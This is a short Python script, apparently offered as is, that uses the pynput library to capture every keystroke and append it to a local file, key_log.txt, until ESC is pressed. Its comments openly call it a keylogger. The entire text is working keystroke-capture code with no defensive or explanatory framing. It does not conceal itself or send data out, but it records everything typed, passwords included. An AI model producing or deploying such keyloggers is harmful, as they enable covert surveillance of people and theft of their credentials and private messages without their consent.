import pynput
from pynput.keyboard import Key, Listener

# File to save the log
log_file = "key_log.txt"

# Function to write keystrokes to the log file
def write_to_file(key):
    with open(log_file, "a") as f:
        f.write(str(key) + "\n")

# Function to handle keystrokes
def on_press(key):
    write_to_file(key)
    # Stop listener if ESC key is pressed
    if key == Key.esc:
        return False

# Start the keylogger
with Listener(on_press=on_press) as listener:
    listener.join()
